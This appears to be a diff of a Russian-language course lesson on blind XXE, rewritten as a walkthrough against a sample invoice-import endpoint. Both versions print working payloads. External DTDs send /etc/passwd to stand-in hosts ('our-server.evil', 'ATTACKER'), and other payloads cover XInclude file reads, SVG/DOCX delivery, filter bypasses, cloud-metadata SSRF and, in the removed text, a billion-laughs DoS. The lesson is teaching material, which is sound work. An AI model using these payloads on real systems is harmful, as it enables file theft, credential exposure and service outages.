@@ -15,346 +15,199 @@ estimated_minutes: 42
 summary: "Продвинутый XXE: слепая OOB-эксфильтрация, parameter entities, error-based, XInclude, XXE→SSRF и обход фильтров."
 ---
 
-Blind XXE — это XXE, когда результат **не отражается** в ответе: парсер не возвращает содержимое файла или не отдаёт ошибок. Тогда данные извлекают через **out-of-band (OOB)** канал (внешний DTD + HTTP/DNS), через error-based технику (вывести данные в сообщении об ошибке) или через XInclude (когда контролируется не весь XML-документ). Это продвинутый уровень `web-xxe`, нужный, когда базовый `<!ENTITY xxe SYSTEM "file:///etc/passwd">` не даёт видимого результата.
+В прошлом уроке нам повезло: сервер вернул содержимое `/etc/passwd` прямо в сообщении об ошибке. Но так бывает редко. Чаще приложение «проглатывает» XML, создаёт счёт и отвечает просто `{"status":"ok"}`. Данные мы прочитали — а увидеть их не можем. Значит, нужно вынести их наружу так, чтобы сервер сам отправил их нам. Этому и посвящён продвинутый XXE.
 
-## Теория: почему in-band не работает
+Возьмём тот же импорт счетов в `shop.local`, но теперь — «слепую» версию: сервер не показывает ни файл, ни ошибку.
 
-In-band XXE требует, чтобы значение сущности попало в отражённый ответ. Если приложение только парсит XML (без эха), нужно exfil-канал. Каналы:
+## Наш пример: сервер молчит
 
-- **OOB HTTP/DNS:** сущность подгружает внешний DTD, который формирует запрос с данными.
-- **Error-based:** данные встраиваются в путь/имя, вызывая ошибку с их содержимым.
-- **XInclude:** инъекция не в DOCTYPE, а в сам документ.
+Пробуем базовый приём из прошлого урока и не видим данных:
 
-## Техника 1: blind OOB через внешний DTD
-
-Шаг 1 — на своём сервере размещаем `evil.dtd`:
-
-```xml
-<!ENTITY % file SYSTEM "file:///etc/passwd">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER/?x=%file;'>">
-%eval;
-%exfil;
+```bash
+$ curl -s 'https://shop.local/api/import-invoice' \
+  -H 'Content-Type: application/xml' \
+  --data '<?xml version="1.0"?>
+<!DOCTYPE invoice [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<invoice><number>42</number><seller>&xxe;</seller></invoice>'
+{"status":"ok","invoice":42}
 ```
 
-Шаг 2 — жертве отправляем XML, подгружающий DTD:
+Сервер принял документ и создал счёт. Содержимое файла нигде не появилось — оно ушло в поле «продавец», которое нам не показывают. Это **blind XXE** («слепой» — без вывода). Данные прочитаны, но канал утечки закрыт.
+
+## Шаг 1: идея OOB — вынести данные на свой сервер
+
+Ключ к слепому XXE — заставить **сам парсер** сделать запрос с данными на адрес, который мы контролируем. Это называется **out-of-band** (OOB, «вне полосы»): данные приходят не в ответе, а на наш слушатель. Поднимем простой приём на своей машине:
+
+```bash
+$ nc -lvnp 80
+```
+
+Теперь сформируем документ, где сущность ссылается на наш сервер:
+
+```bash
+$ curl -s 'https://shop.local/api/import-invoice' \
+  -H 'Content-Type: application/xml' \
+  --data '<?xml version="1.0"?>
+<!DOCTYPE invoice [<!ENTITY xxe SYSTEM "http://our-server.evil/probe">]>
+<invoice><seller>&xxe;</seller></invoice>'
+```
+
+В окне `nc` появится входящий запрос:
+
+```
+GET /probe HTTP/1.1
+Host: our-server.evil
+```
+
+Это доказательство: парсер обрабатывает внешние сущности и ходит по нашим URL. Осталось заставить его принести **содержимое файла**.
+
+## Шаг 2: параметрические сущности и внешний DTD
+
+Проблема: просто подставить файл в URL не выйдет — содержимое `/etc/passwd` содержит символы (пробелы, двоеточия), которые сломают URL. Решение — **внешний DTD**: файл с определениями сущностей, который лежит на нашем сервере. В нём мы используем **параметрические сущности** — они объявляются со знаком `%` и живут только внутри DTD (обычные `&...;` — в теле документа).
+
+Сначала документ:
 
 ```xml
 <?xml version="1.0"?>
-<!DOCTYPE r [
-  <!ENTITY % dtd SYSTEM "http://ATTACKER/evil.dtd">
+<!DOCTYPE invoice [
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  <!ENTITY % dtd SYSTEM "http://our-server.evil/evil.dtd">
   %dtd;
 ]>
-<r>&exfil;</r>
+<invoice><seller>&send;</seller></invoice>
 ```
 
-Шаг 3 — на нашем сервере в логах видим `GET /?x=<содержимое /etc/passwd>`. Требование: сервер жертвы имеет egress и резолвит наш домен.
+На нашем сервере лежит `evil.dtd`:
 
-Для многострочных файлов используйте PHP-обёртку `php://filter/convert.base64-encode/resource=/etc/passwd`:
-
-```xml
-<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+```
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://our-server.evil/?%file;'>">
+%all;
 ```
 
-## Техника 2: error-based
+Разберём по шагам. `%file` читает `/etc/passwd` и кладёт его в переменную. `%dtd` подгружает наш `evil.dtd`. Внутри DTD мы динамически строим сущность `send`, чей URL содержит содержимое `%file`. Затем `&send;` в теле документа заставляет парсер обратиться по этому URL — и содержимое файла уходит нам. В логе `nc` увидим:
 
-Когда OOB недоступен (нет egress), но есть сообщение об ошибке — выводим данные через некорректный путь:
-
-```xml
-<!ENTITY % file SYSTEM "file:///etc/passwd">
-<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
-%eval;
-%error;
+```
+GET /?root:x:0:0:root:/root:/bin/bash... HTTP/1.1
 ```
 
-Парсер попытается открыть файл с именем, содержащим содержимое `/etc/passwd`, и выдаст ошибку с этим путём.
+Данные вынесены. Мы получили чтение файла, не видя ответа приложения.
 
-## Техника 3: XInclude
+## Шаг 3: error-based — когда OOB закрыт
 
-Если контролируется только значение внутри XML (не DOCTYPE), используем XInclude:
+Иногда исходящие соединения наружу заблокированы, и OOB не работает. Тогда используют **error-based** технику: содержимое файла вставляют в **путь** внешней сущности, чтобы парсер выдал ошибку с этим путём в сообщении. Например, наш DTD формирует ссылку на `file:///nonexistent/<содержимое>`, и приложение печатает «cannot open file `/nonexistent/root:x:0:0:...`». Данные утекают через текст ошибки. Работает только если приложение показывает ошибки парсера.
 
-```xml
-<r xmlns:xi="http://www.w3.org/2001/XInclude">
-  <xi:include href="file:///etc/passwd" parse="text"/>
-</r>
-```
+Ключевая идея та же, что и в OOB, но канал другой: не наш слушатель, а **сообщение об ошибке**, которое видит пользователь. Поэтому error-based особенно ценен там, где egress наружу закрыт, но приложение «болтливо» и возвращает детали исключения. Если в ответе видно имя несуществующего файла с подставленным содержимым — утечка удалась.
 
-Сработает, если парсер поддерживает XInclude (часто включён в Java/PHP/.NET).
+## Шаг 4: XInclude — когда DOCTYPE запрещён
 
-## Техника 4: XXE через файлы (SVG/DOCX)
-
-XXE можно доставить не в теле XML, а через **загружаемый файл**:
-
-- **SVG:** `<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="..."><image xlink:href="expect://..."/></svg>` или с DOCTYPE.
-- **DOCX/XLSX:** внутри — XML-части; правим `document.xml`/`[Content_Types].xml` и упаковываем.
-- **RSS/Atom/SOAP:** тот же принцип.
+Разработчики часто запрещают `<!DOCTYPE` целиком — тогда внешние сущности объявить нельзя. Но есть отдельная директива **XInclude**, которая включается прямо в тело документа и не требует DOCTYPE:
 
 ```bash
-# правка docx: распаковать, вставить DOCTYPE в word/document.xml, упаковать
-unzip -o doc.docx -d doc && # правим word/document.xml && cd doc && zip -r ../evil.docx .
-```
-
-## Разобранный пример: blind XXE → /etc/passwd
-
-Шаг 1 — поднимаем listener (`python3 -m http.server 80`) и кладём `evil.dtd` (см. выше).
-Шаг 2 — отправляем XML:
-
-```bash
-curl -s -X POST https://app.example/api/xml \
+$ curl -s 'https://shop.local/api/import-invoice' \
   -H 'Content-Type: application/xml' \
-  --data-binary '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % dtd SYSTEM "http://ATTACKER/evil.dtd">%dtd;]><r>&exfil;</r>'
+  --data '<invoice xmlns:xi="http://www.w3.org/2001/XInclude">
+    <xi:include href="file:///etc/passwd" parse="text"/>
+  </invoice>'
 ```
 
-Шаг 3 — в логах listener видим содержимое файла.
+`xi:include` говорит парсеру «вставь сюда содержимое файла». Если XInclude включён, чтение файла работает даже без DOCTYPE. Это частый обход, который забывают закрыть.
 
-## Обход фильтров XXE
+## Шаг 5: XXE в загрузках файлов
 
-- **Фильтр по `<!DOCTYPE`** → XInclude, или кодирование.
-- **Фильтр по `SYSTEM`/`ENTITY`** → регистр, пробелы, `PUBLIC`.
-- **Запрет внешних сущностей, но разрешённые внутренние** → parameter entities.
-- **Фильтр по `file://`** → `php://filter`, `file:///`, `netdoc://` (Java).
-- **OOB заблокирован (egress)** → error-based.
-
-## Инструменты
-
-- **Burp Collaborator/`interactsh`** — OOB-канал.
-- **`XXEinjector`/`xxexploiter`** — автоматизация.
-- **`python3 -m http.server`** — свой DTD-хост.
-- **`oxml_xxe`** — генерация DOCX/SVG-payload.
-
-## Что дальше / decision
-
-1. Есть XML-парсинг → проверьте `<!ENTITY xxe SYSTEM "file:///etc/passwd">`.
-2. In-band не работает → OOB через внешний DTD.
-3. OOB заблокирован → error-based.
-4. Контролируете только значение → XInclude.
-5. Есть загрузка файлов → SVG/DOCX.
-6. Дальше — SSRF к metadata (см. `web-ssrf-*`).
-
-## Частые ошибки
-
-- **Сдаваться, когда не видно вывода.** Используйте OOB/error-based.
-- **Забыть про egress.** OOB требует исходящего трафика.
-- **Не попробовать XInclude.** Когда DOCTYPE недоступен.
-- **Игнорировать файлы (SVG/DOCX).** Частый вектор доставки.
-- **Ломать прод.** Чтение файлов/SSRF — аккуратно.
-
-## SSRF через XXE: внутренние сервисы и облако
-
-XXE — это ещё и SSRF: внешний DTD или entity заставляет сервер делать HTTP-запрос.
+Тот же приём работает через файлы, внутри которых XML. Популярный носитель — **SVG** (векторная картинка, которая на самом деле XML). Если сайт принимает аватар в SVG, вкладываем DOCTYPE в начало:
 
 ```xml
 <?xml version="1.0"?>
-<!DOCTYPE r [
-  <!ENTITY % f SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
-  <!ENTITY % p "<!ENTITY exfil SYSTEM 'http://attacker/?d=%f;'>">
-  %p;
-]>
-<r>&exfil;</r>
+<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
 ```
 
-Практически удобнее читать метаданные через error-based/OOB, потому что ответ приложения часто не отражается. Цели: `169.254.169.254`, `metadata.google.internal`, `127.0.0.1:порты`, внутренние API.
+Аналогично **DOCX/XLSX** — это zip-архивы; распаковываем, правим `word/document.xml`, добавляем DOCTYPE и упаковываем обратно. Сервер, разбирая документ, читает файл. Такие «документные» XXE часто остаются незамеченными, потому что разработчики думают только про явные XML-API.
 
-## DoS через сущности: billion laughs и quadratic blowup
+## Шаг 6: обход фильтров
 
-XXE опасен не только чтением — рекурсивные сущности «съедают» память.
+Что делать, если часть слов фильтруется:
 
-```xml
-<?xml version="1.0"?>
-<!DOCTYPE lolz [
-  <!ENTITY lol "lol">
-  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
-  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
-  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
-]>
-<lolz>&lol3;</lolz>
-```
+- **Фильтр по `SYSTEM`** — используем `PUBLIC` или регистр (`system`), либо кодируем документ.
+- **Фильтр по `file://`** — `php://filter/convert.base64-encode/resource=/etc/passwd`, чтобы вынести данные в base64 (и обойти проблемы с символами).
+- **Фильтр по `<!DOCTYPE`** — XInclude (см. Шаг 4) или кодировка UTF-16, где байты не совпадают с ASCII-шаблоном фильтра.
+- **Egress закрыт** — error-based вместо OOB.
 
-Каждый уровень увеличивает размер в 10 раз — `lol9` даёт гигабайты. **Это деструктивно**: не запускайте на проде без разрешения; проверяйте только на своём стенде.
+## Шаг 7: где ещё пригодится слепой XXE
 
-## XXE в разных контекстах: SOAP, SAML, DOCX, SVG
+Тот же внешний DTD работает не только против API. **SAML** (корпоративный вход) — это XML, который сервер разбирает при каждой авторизации; если парсер не закрыт, слепой XXE там читает файлы и делает SSRF. **RSS/Atom**-подписки, куда пользователь вставляет URL фида, тоже разбираются XML-парсером. **SOAP**-сервисы принимают XML целиком. Общий признак один: где-то в приложении есть XML-парсер, обрабатывающий наш ввод, и там можно объявить сущность. Не ограничивайся «очевидными» XML-эндпоинтами — проверь всё, что принимает XML-совместимый формат.
 
-| Контекст | Точка инъекции | Особенность |
-|----------|----------------|-------------|
-| SOAP | SOAP-тело | часто XML принимается без вопросов |
-| SAML | assertion | подпись проверяется не всегда |
-| DOCX/XLSX | `word/document.xml`, `[Content_Types].xml` | XML внутри zip |
-| SVG | сам файл | при загрузке аватара |
-| RSS/Atom | фид | при импорте |
-| JSON→XML конвертеры | поле JSON | XML генерится из JSON |
-| PDF | XFA | реже |
+## Что мы теперь знаем
 
-```bash
-# DOCX: подменяем XML внутри архива
-unzip doc.docx -d docx_src
-# правим docx_src/word/document.xml, добавляя DOCTYPE + entity
-cd docx_src && zip -r ../evil.docx . && cd ..
-curl -s -F 'file=@evil.docx' https://app.example/upload
-```
+- **Blind XXE** — данных в ответе нет, но их можно вынести.
+- **OOB** — парсер сам обращается к нашему серверу с данными.
+- **Параметрические сущности (`%`)** и **внешний DTD** формируют утечку.
+- **Error-based** — вынос через текст ошибки, когда OOB закрыт.
+- **XInclude** — чтение файла без DOCTYPE.
+- Носители: SVG, DOCX/XLSX, RSS, SAML.
 
-## Полный арсенал payload'ов
+## На что смотреть дальше
 
-```xml
-<!-- 1) простой файл -->
-<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>
-
-<!-- 2) SSRF -->
-<!DOCTYPE r [<!ENTITY x SYSTEM "http://127.0.0.1:8080/admin">]><r>&x;</r>
-
-<!-- 3) blind OOB с внешним DTD -->
-<!DOCTYPE r SYSTEM "http://attacker/evil.dtd"><r>&exfil;</r>
-
-<!-- 4) parameter entity для exfil -->
-<!DOCTYPE r [<!ENTITY % p SYSTEM "http://attacker/evil.dtd"> %p;]><r>&exfil;</r>
-
-<!-- 5) XInclude (когда DOCTYPE запрещён) -->
-<r xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></r>
-
-<!-- 6) UTF-16/UTF-7 кодировка для обхода -->
-```
-
-## Обход фильтров XXE
-
-| Фильтр | Обход |
-|--------|-------|
-| Блок `<!DOCTYPE` | XInclude |
-| Блок `SYSTEM` | `PUBLIC`, параметр-сущности |
-| Блок `file://` | `php://filter`, `jar://`, `netdoc://` |
-| Кодировка ASCII | UTF-16/UTF-7/UTF-32 |
-| Блок внешних DTD | локальный DTD с редиректом (`/etc/hosts` и т.п.) |
-| Вырезание `ENTITY` | разбиение регистра/пробелами (если парсер терпим) |
-
-```bash
-# UTF-16 обход: перекодируем payload
-iconv -f UTF-8 -t UTF-16 payload.xml > payload16.xml
-curl -s -X POST https://app.example/api --data-binary @payload16.xml \
-  -H 'Content-Type: application/xml'
-```
-
-## Что делать дальше / решение
-
-1. **Найдите XML-вход.** SOAP, SAML, загрузка DOCX/SVG, RSS-импорт.
-2. **Проверьте DOCTYPE.** Принимается ли внешний DTD/entity.
-3. **In-band или blind.** Отражение → file://; иначе → OOB/error-based.
-4. **Настройте OOB.** Внешний DTD на своём сервере + listener.
-5. **Проверьте SSRF-цели.** Метаданные, внутренние API.
-6. **Зафиксируйте PoC.** XML + прочитанный файл/ушедший callback.
-
-## Практика и справочники
-
-- **PortSwigger Academy** — «XXE injection» (все лаборатории).
-- **HackTricks** — «XXE».
-- **PayloadsAllTheThings** — «XXE Injection».
-- **`xxe-injector`**, **`oxml`** — автоматизация.
-
-## Защита от XXE и что ломается на практике
-
-Корректная защита — отключить обработку внешних сущностей и DTD в парсере. Примеры по языкам:
-
-```python
-# Python (defusedxml)
-import defusedxml.ElementTree as ET
-ET.parse(user_file)
-```
-
-```java
-// Java: DocumentBuilderFactory
-dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
-dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
-dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
-dbf.setXIncludeAware(false);
-dbf.setExpandEntityReferences(false);
-```
-
-```php
-// PHP (libxml >= 2.9): по умолчанию внешние сущности выключены
-libxml_disable_entity_loader(true);   // для старых версий
-```
-
-```csharp
-// .NET
-XmlReaderSettings s = new XmlReaderSettings { DtdProcessing = DtdProcessing.Prohibit };
-```
-
-На практике ломается там, где приложение парсит XML «внутренней» библиотекой, которую никто не настраивал: старые версии `libxml`, кастомные парсеры, конвертеры JSON↔XML.
-
-## Почему XXE всё ещё жив
-
-| Причина | Где встречается |
-|---------|-----------------|
-| Легаси-парсеры | Java/PHP-приложения до 2018 |
-| Библиотеки по умолчанию | старые `libxml`, `lxml` с `resolve_entities=True` |
-| Конвертеры форматов | DOCX/SVG/PDF-пайплайны |
-| SAML/SOAP | подписи без защиты от entity |
-| «Безопасный» XML | самописные парсеры без настроек |
-
-Даже когда XML «не используется напрямую», он прячется внутри DOCX, SVG, RSS, SAML и SOAP — а значит, XXE стоит проверять всюду, где есть загрузка или импорт «структурированных» данных.
-
-## Что делать дальше / решение (кратко)
-
-1. Найдите все XML-точки входа (включая файлы-архивы).
-2. Проверьте DOCTYPE/entity/XInclude.
-3. In-band → file://, иначе → OOB/error-based.
-4. Проверьте SSRF-цели (метаданные).
-5. Оформите PoC с прочитанным файлом/ушедшим callback.
-
-## Практика
-
-- **PortSwigger Academy** — XXE (1–9).
-- **HackTricks** — XXE.
-- **PayloadsAllTheThings** — XXE.
-
-## Коротко о приоритетах
-
-На практике XXE чаще всего «живёт» в трёх местах: загрузка файлов-архивов (DOCX/XLSX/SVG), SOAP/SAML-эндпоинты и легаси-Java/PHP парсеры. Именно их стоит проверять в первую очередь, потому что там XML обрабатывается «внутренней» библиотекой без явной настройки безопасности. Начните с простого `file://`-payload'а; если ответ не отражается, переходите к blind OOB с внешним DTD и error-based извлечению — и фиксируйте PoC прочитанным файлом или пришедшим callback'ом.
+- **Слушатель всегда наготове:** поднимай `nc` или Burp Collaborator до отправки payload.
+- **DTD на нашем хосте** должен отдаваться как `text/xml` или `application/xml`.
+- **Кодировка:** если ASCII-фильтр режет `ENTITY`, попробуй UTF-16 — часто проскакивает.
+- **Связка с SSRF:** сущность с `http://169.254.169.254/` даёт SSRF → метаданные.
+- **Проверяй одиночные символы:** blind XXE без OOB иногда подтверждается лишь по факту, что парсер «повис» на внешнем ресурсе.
 
 ## Квиз
 
+Выбери один вариант в каждом вопросе.
+
 ```quiz
-- question: "Зачем внешний DTD в blind XXE?"
+- question: "Почему базовый XXE не сработал в нашем примере?"
   options:
-    - "Для красоты"
-    - "Определяет сущности для чтения файла и OOB-эксфильтрации"
-    - "Для TLS"
-    - "Для cookie"
+    - "Сервер не разбирает XML"
+    - "Сервер разобрал XML, но не показал содержимое (blind XXE)"
+    - "Файл /etc/passwd не существует"
+    - "Нужен HTTPS"
   answer: 1
-  explanation: "Позволяет читать и отправлять данные наружу."
-- question: "Почему для многострочных файлов используют FTP?"
+  explanation: "Данные прочитаны, но ушли в поле, которое не отображается — это слепой XXE."
+- question: "Что такое OOB-эксфильтрация?"
   options:
-    - "Он быстрее"
-    - "HTTP-URL ломается на переводах строк, FTP передаёт построчно"
-    - "Он шифрует"
-    - "Он кеширует"
+    - "Вынос данных в ответе приложения"
+    - "Парсер сам отправляет данные на подконтрольный нам сервер"
+    - "Чтение данных из базы"
+    - "Сканирование портов"
   answer: 1
-  explanation: "FTP терпим к многострочности."
-- question: "Как работает error-based XXE?"
+  explanation: "Out-of-band — данные приходят на наш слушатель, а не в ответе."
+- question: "Для чего нужны параметрические сущности (`%`) и внешний DTD?"
   options:
-    - "Через SQL"
-    - "Данные подставляются в путь несуществующего файла -> ошибка с содержимым"
-    - "Через XSS"
-    - "Через cookie"
+    - "Для ускорения парсинга"
+    - "Чтобы динамически собрать сущность с содержимым файла в URL"
+    - "Чтобы зашифровать документ"
+    - "Чтобы обойти TLS"
   answer: 1
-  explanation: "Ошибка парсера раскрывает данные."
-- question: "Что такое XInclude?"
+  explanation: "Внутри внешнего DTD мы строим сущность `send`, чей URL содержит прочитанный файл."
+- question: "Что делать, если `<!DOCTYPE` запрещён?"
   options:
-    - "SQL"
-    - "Механизм включения файлов в XML без DOCTYPE"
-    - "JSON"
-    - "Cookie"
+    - "Сдаться"
+    - "Использовать XInclude с `href='file:///etc/passwd'`"
+    - "Сменить метод на POST"
+    - "Отключить JavaScript"
   answer: 1
-  explanation: "Работает, когда DOCTYPE запрещён."
-- question: "В каком формате можно спрятать XXE?"
+  explanation: "XInclude включается в тело документа и не требует DOCTYPE."
+- question: "Зачем выносить файл в base64 (`php://filter/convert.base64-encode`)?"
   options:
-    - "Только XML"
-    - "SVG, DOCX/XLSX, SOAP/SAML, PDF/XFA"
-    - "Только PNG"
-    - "Только TXT"
+    - "Чтобы уменьшить размер"
+    - "Чтобы обойти проблемы с символами и фильтры по путям"
+    - "Чтобы ускорить запрос"
+    - "Чтобы получить RCE"
   answer: 1
-  explanation: "Любой XML-содержащий формат."
+  explanation: "base64 делает содержимое безопасным для URL и обходит фильтры по `file://`."
 ```
+
+## Куда дальше
+
+Мы научились выносить данные, когда приложение молчит. Но самая дорогая цель SSRF/XXE — облачные метаданные: там лежат временные ключи роли. В следующем уроке разберём **SSRF в облака**: AWS/GCP/Azure metadata, IMDSv1/v2 и кражу IAM-токенов. А пока запомни: **слепой XXE лечится внешним DTD и своим слушателем.**
 
 ## Где пригодится
 
-- **CTF (Web):** XXE-задачи со слепым каналом.
-- **Bug bounty:** XXE OOB — критичный отчёт.
-- **Пентест:** аудит XML-парсеров.
-- **Работа (AppSec):** отключение DTD/внешних сущностей, безопасные парсеры.
+- **CTF (Web):** blind XXE и error-based — типовые шаги к флагу, когда ответ пустой.
+- **Bug bounty:** blind XXE в SAML/API — high/critical; OOB-доказательство обязательно для отчёта.
+- **Пентест:** проверка загрузок SVG/DOCX и всех XML-точек на слепые векторы.
+- **Работа (AppSec):** полное отключение внешних сущностей и DOCTYPE, включая XInclude.
